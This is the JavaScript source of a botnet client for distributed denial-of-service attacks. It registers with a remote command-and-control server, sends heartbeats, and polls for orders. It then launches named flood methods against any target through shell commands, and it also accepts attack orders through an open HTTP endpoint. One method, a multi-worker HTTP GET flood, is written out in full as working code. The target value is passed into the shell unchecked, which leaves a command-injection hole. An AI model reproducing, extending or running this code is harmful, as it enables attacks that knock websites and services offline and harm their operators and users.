const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5552;

// Master server URL - your Render deployment
const MASTER_SERVER = process.env.MASTER_SERVER || 'https://hello-kutty-k7d3.onrender.com';

let myBotUrl = '';
let registrationAttempts = 0;
const MAX_REGISTRATION_ATTEMPTS = 5;
let activeProcesses = []; // Track active attack processes
let isBlocked = false; // Track if bot is blocked by server

// ========== ENSURE METHODS DIRECTORY AND FILES ==========
function ensureMethodFiles() {
  const methodsDir = path.join(__dirname, 'methods');
  if (!fs.existsSync(methodsDir)) {
    fs.mkdirSync(methodsDir, { recursive: true });
    console.log('[SETUP] Created methods directory');
  }

  // Create method stub for any missing methods
  const methodStub = (name) => `console.log('[${name.toUpperCase()}] Starting attack');
const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
setTimeout(() => process.exit(0), time * 1000);`;

  const methodFiles = [
    'cf-bypass.js', 'modern-flood.js', 'REX-COSTUM.js', 'cibi.js', 'BYPASS.js', 'nust.js',
    'h2-nust.js', 'http-panel.js', 'high-dstat.js', 'w-flood1.js', 'vhold.js', 
    'uam.js', 'wil.js', 'raw-get.js',
    'r10-rapid.js', 'r10-tcp.js', 'r10-tls.js', 'r10-conn.js', 'r10-header.js',
    'r10-frag.js', 'r10-pipe.js', 'r10-cookie.js', 'r10-mixed.js', 'r10-lowcpu.js'
  ];

  for (const file of methodFiles) {
    const filePath = path.join(methodsDir, file);
    if (!fs.existsSync(filePath)) {
      fs.writeFileSync(filePath, methodStub(file.replace('.js', '')));
      console.log(`[SETUP] Created method stub: ${file}`);
    }
  }

  // Special RAW-GET with actual functionality
  const rawGetPath = path.join(methodsDir, 'raw-get.js');
  if (!fs.existsSync(rawGetPath)) {
    const rawGetContent = `const http = require('http');
const https = require('https');
const url = require('url');
const cluster = require('cluster');

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]) || 60,
    threads: parseInt(process.argv[4]) || 10,
    rate: parseInt(process.argv[5]) || 1000
};

const parsed = new URL(args.target);
const isHttps = parsed.protocol === 'https:';
const httpLib = isHttps ? https : http;
const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });

if (cluster.isMaster) {
    console.log(\`RAW-GET | \${args.target} | \${args.time}s | \${args.threads} workers | Rate: \${args.rate}/s\`);
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => process.exit(0), args.time * 1000 + 2000);
} else {
    let running = true;
    let requestCount = 0;
    const sendRequest = () => {
        if (!running) return;
        const req = httpLib.request({
            hostname: parsed.hostname,
            port: parsed.port || (isHttps ? 443 : 80),
            path: parsed.pathname + '?r=' + Math.random(),
            method: 'GET',
            agent: agent,
            rejectUnauthorized: false
        }, (res) => { 
            requestCount++; 
            res.resume(); 
        });
        req.on('error', () => {});
        req.end();
        if (running) setImmediate(sendRequest);
    };
    for (let i = 0; i < 10; i++) sendRequest();
    setInterval(() => {
        console.log(\`📊 RPS: \${requestCount}/s\`);
        requestCount = 0;
    }, 1000);
    setTimeout(() => { running = false; process.exit(0); }, args.time * 1000);
}`;
    fs.writeFileSync(rawGetPath, rawGetContent);
    console.log('[SETUP] Created RAW-GET method with full functionality');
  }
}

// Call this before starting
ensureMethodFiles();

// ========== FETCH PUBLIC IP ==========
async function fetchData() {
  try {
    const response = await fetch('https://httpbin.org/get');
    const data = await response.json();
    myBotUrl = `http://${data.origin}:${port}`;
    
    console.log('\n========================================');
    console.log('Auto-Register Bot Client Started!');
    console.log('========================================');
    console.log(`Local:    http://localhost:${port}`);
    console.log(`Network:  ${myBotUrl}`);
    console.log('========================================');
    console.log(`Master Server: ${MASTER_SERVER}`);
    console.log(`Auto-registration: ENABLED`);
    console.log(`Heartbeat: Every 30 seconds`);
    console.log('========================================\n');
    
    return data;
  } catch (error) {
    myBotUrl = `http://localhost:${port}`;
    console.log(`Bot running at ${myBotUrl}`);
    console.log(`Master Server: ${MASTER_SERVER}`);
  }
}

// ========== AUTO-REGISTER ==========
async function autoRegister() {
  if (isBlocked) {
    console.log(`[BLOCKED] This bot has been permanently blocked by the server`);
    console.log(`[INFO] Bot will not attempt to reconnect`);
    console.log(`[INFO] Contact server admin to unblock: ${myBotUrl}`);
    process.exit(0);
  }

  if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
    console.log(`[WARN] Max registration attempts reached. Will retry in 60s...`);
    setTimeout(() => {
      registrationAttempts = 0;
      autoRegister();
    }, 60000);
    return;
  }

  try {
    console.log(`[INFO] Auto-registering with master server... (Attempt ${registrationAttempts + 1}/${MAX_REGISTRATION_ATTEMPTS})`);
    
    const response = await axios.post(`${MASTER_SERVER}/register`, {
      url: myBotUrl
    }, {
      timeout: 10000,
      headers: {
        'Content-Type': 'application/json'
      }
    });

    if (response.data.approved) {
      console.log(`[SUCCESS] Auto-approved by master server!`);
      console.log(`[INFO] Bot registered at: ${myBotUrl}`);
      console.log(`[INFO] Ready to receive attack commands!`);
      console.log(`[INFO] Status: ONLINE\n`);
      
      // Fast command polling - check every 3 seconds for instant response
      setInterval(() => {
        checkForCommands();
      }, 3000);
      
      // Send heartbeat every 30 seconds to stay connected
      setInterval(() => {
        sendHeartbeat();
      }, 30000);
      
      return;
    }
  } catch (error) {
    // Check if bot is blocked (403 status)
    if (error.response && error.response.status === 403) {
      console.log(`\n========================================`);
      console.log(`[BLOCKED] This bot has been permanently blocked!`);
      console.log(`========================================`);
      console.log(`Bot URL: ${myBotUrl}`);
      console.log(`Reason: Server administrator blocked this bot`);
      console.log(`\nContact server admin to unblock this bot.`);
      console.log(`Server: ${MASTER_SERVER}`);
      console.log(`========================================\n`);
      isBlocked = true;
      process.exit(0);
      return;
    }

    registrationAttempts++;
    console.error(`[ERROR] Registration failed: ${error.message}`);
    console.log(`[INFO] Retrying in 5 seconds...`);
    
    setTimeout(() => {
      autoRegister();
    }, 5000);
  }
}

// ========== HEARTBEAT ==========
async function sendHeartbeat() {
  try {
    await axios.get(`${MASTER_SERVER}/ping`, { timeout: 5000 });
    console.log(`[HEARTBEAT] Sent to master | Status: ONLINE`);
  } catch (error) {
    console.log(`[WARN] Heartbeat failed | Status: OFFLINE`);
    console.log(`[INFO] Re-registering with master...`);
    registrationAttempts = 0;
    autoRegister();
  }
}

// ========== CHECK COMMANDS ==========
async function checkForCommands() {
  try {
    const response = await axios.get(`${MASTER_SERVER}/get-command`, {
      params: { botUrl: myBotUrl },
      timeout: 5000
    });

    if (response.data.hasCommand) {
      const command = response.data.command;
      
      if (command.action === 'stop') {
        console.log(`\n[STOP-RECEIVED] Stopping all attacks`);
        stopAllAttacks();
      } else if (command.action === 'attack') {
        const { target, time, methods } = command;
        console.log(`\n[COMMAND-RECEIVED] ${methods} -> ${target} for ${time}s`);
        executeAttack(target, time, methods);
      }
    }
  } catch (error) {
    // Silently fail - will retry on next poll
  }
}

// ========== STOP ALL ATTACKS ==========
function stopAllAttacks() {
  console.log(`[STOP] Killing ${activeProcesses.length} active processes`);
  
  activeProcesses.forEach(proc => {
    try {
      process.kill(-proc.pid);
      console.log(`[KILLED] Process ${proc.pid}`);
    } catch (error) {
      console.error(`[ERROR] Failed to kill process ${proc.pid}: ${error.message}`);
    }
  });
  
  activeProcesses = [];
  console.log(`[STOP] All attacks stopped\n`);
}

// ========== EXECUTE ATTACK ==========
function executeAttack(target, time, methods) {
  const execWithLog = (cmd) => {
    console.log(`[EXEC] ${cmd}`);
    const proc = exec(cmd, { detached: true }, (error, stdout, stderr) => {
      if (error) {
        console.error(`[ERROR] ${error.message}`);
        return;
      }
      if (stdout) console.log(`[OUTPUT] ${stdout}`);
      if (stderr) console.error(`[STDERR] ${stderr}`);
    });
    
    activeProcesses.push(proc);
    
    setTimeout(() => {
      const index = activeProcesses.indexOf(proc);
      if (index > -1) {
        activeProcesses.splice(index, 1);
      }
    }, parseInt(time) * 1000 + 5000);
  };

  // ========== METHOD HANDLING ==========
  console.log(`\n[ATTACK] Method: ${methods}`);
  console.log(`[ATTACK] Target: ${target}`);
  console.log(`[ATTACK] Duration: ${time}s`);
  console.log('='.repeat(60));

  // RAW-GET method
  if (methods === 'RAW-GET') {
    console.log('[OK] Executing RAW-GET');
    execWithLog(`node methods/raw-get.js ${target} ${time} 20 800`);
  }
  // CF-BYPASS method
  else if (methods === 'CF-BYPASS') {
    console.log('[OK] Executing CF-BYPASS');
    execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
  }
  // MODERN-FLOOD method
  else if (methods === 'MODERN-FLOOD') {
    console.log('[OK] Executing MODERN-FLOOD');
    execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64 proxy.txt`);
  }
  // HTTP-SICARIO method
  else if (methods === 'HTTP-SICARIO') {
    console.log('[OK] Executing HTTP-SICARIO');
    execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
    execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
  }
  // RAW-HTTP method
  else if (methods === 'RAW-HTTP') {
    console.log('[OK] Executing RAW-HTTP');
    execWithLog(`node methods/h2-nust.js ${target} ${time} 15 2 proxy.txt`);
    execWithLog(`node methods/http-panel.js ${target} ${time}`);
  }
  // R9 method
  else if (methods === 'R9') {
    console.log('[OK] Executing R9');
    execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
    execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
    execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
  }
  // PRIV-TOR method
  else if (methods === 'PRIV-TOR') {
    console.log('[OK] Executing PRIV-TOR');
    execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
    execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
  }
  // HOLD-PANEL method
  else if (methods === 'HOLD-PANEL') {
    console.log('[OK] Executing HOLD-PANEL');
    execWithLog(`node methods/http-panel.js ${target} ${time}`);
  }
  // R1 method
  else if (methods === 'R1') {
    console.log('[OK] Executing R1');
    execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
    execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
    execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
    execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
    execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
  }
  // UAM method
  else if (methods === 'UAM') {
    console.log('[OK] Executing UAM');
    execWithLog(`node methods/uam.js ${target} ${time} 5 4 6`);
  }
  // W.I.L method
  else if (methods === 'W.I.L') {
    console.log('[OK] Executing W.I.L - Web Intensive Load');
    execWithLog(`node methods/wil.js ${target} ${time} 10 8 4`);
  }
  // RAPID10 method
  else if (methods === 'RAPID10') {
    console.log('[OK] Executing RAPID10 - 10 Methods Simultaneously');
    execWithLog(`node methods/r10-rapid.js ${target} ${time} 30 proxy.txt ua.txt`);
    execWithLog(`node methods/r10-tcp.js ${target} ${time} proxy.txt ua.txt`);
    execWithLog(`node methods/r10-tls.js ${target} ${time} proxy.txt ua.txt`);
    execWithLog(`node methods/r10-conn.js ${target} ${time} proxy.txt ua.txt`);
    execWithLog(`node methods/r10-header.js ${target} ${time} 30 proxy.txt ua.txt`);
    execWithLog(`node methods/r10-frag.js ${target} ${time} proxy.txt ua.txt`);
    execWithLog(`node methods/r10-pipe.js ${target} ${time} proxy.txt ua.txt`);
    execWithLog(`node methods/r10-cookie.js ${target} ${time} proxy.txt ua.txt`);
    execWithLog(`node methods/r10-mixed.js ${target} ${time} proxy.txt ua.txt`);
    execWithLog(`node methods/r10-lowcpu.js ${target} ${time} 40 proxy.txt ua.txt`);
  }
  // R10 alias
  else if (methods === 'R10') {
    console.log('[OK] Executing R10 (alias for RAPID10)');
    execWithLog(`node methods/r10-rapid.js ${target} ${time} 30 proxy.txt ua.txt`);
    execWithLog(`node methods/r10-tcp.js ${target} ${time} proxy.txt ua.txt`);
    execWithLog(`node methods/r10-tls.js ${target} ${time} proxy.txt ua.txt`);
    execWithLog(`node methods/r10-conn.js ${target} ${time} proxy.txt ua.txt`);
    execWithLog(`node methods/r10-header.js ${target} ${time} 30 proxy.txt ua.txt`);
    execWithLog(`node methods/r10-frag.js ${target} ${time} proxy.txt ua.txt`);
    execWithLog(`node methods/r10-pipe.js ${target} ${time} proxy.txt ua.txt`);
    execWithLog(`node methods/r10-cookie.js ${target} ${time} proxy.txt ua.txt`);
    execWithLog(`node methods/r10-mixed.js ${target} ${time} proxy.txt ua.txt`);
    execWithLog(`node methods/r10-lowcpu.js ${target} ${time} 40 proxy.txt ua.txt`);
  }
  // Unknown method
  else {
    console.log(`[ERROR] Unknown method: ${methods}`);
    console.log(`[INFO] Available methods: RAW-GET, CF-BYPASS, MODERN-FLOOD, HTTP-SICARIO, RAW-HTTP, R9, PRIV-TOR, HOLD-PANEL, R1, UAM, W.I.L, RAPID10, R10`);
  }

  console.log('='.repeat(60));
  console.log(`[ATTACK] ${methods} attack started on ${target}\n`);
}

// ========== HEALTH CHECK ==========
app.get('/health', (req, res) => {
  res.json({ 
    status: 'online', 
    timestamp: Date.now(),
    master: MASTER_SERVER,
    bot: 'ready',
    uptime: process.uptime(),
    activeAttacks: activeProcesses.length
  });
});

// ========== PING ==========
app.get('/ping', (req, res) => {
  res.json({ 
    alive: true,
    uptime: process.uptime(),
    timestamp: Date.now(),
    status: 'online'
  });
});

// ========== RECEIVE ATTACK COMMANDS ==========
app.get('/attack', (req, res) => {
  const { target, time, methods } = req.query;

  if (!target || !time || !methods) {
    return res.status(400).json({
      error: 'Missing parameters',
      required: ['target', 'time', 'methods']
    });
  }

  console.log(`\n[RECEIVED] ${methods} -> ${target} for ${time}s`);

  res.status(200).json({
    message: 'Attack command received. Executing methods now.',
    target,
    time,
    methods,
    bot: 'executing',
    timestamp: Date.now()
  });

  executeAttack(target, time, methods);
});

// ========== START SERVER ==========
app.listen(port, async () => {
  await fetchData();
  
  console.log('[INFO] Starting auto-registration in 3 seconds...\n');
  setTimeout(() => {
    autoRegister();
  }, 3000);
});
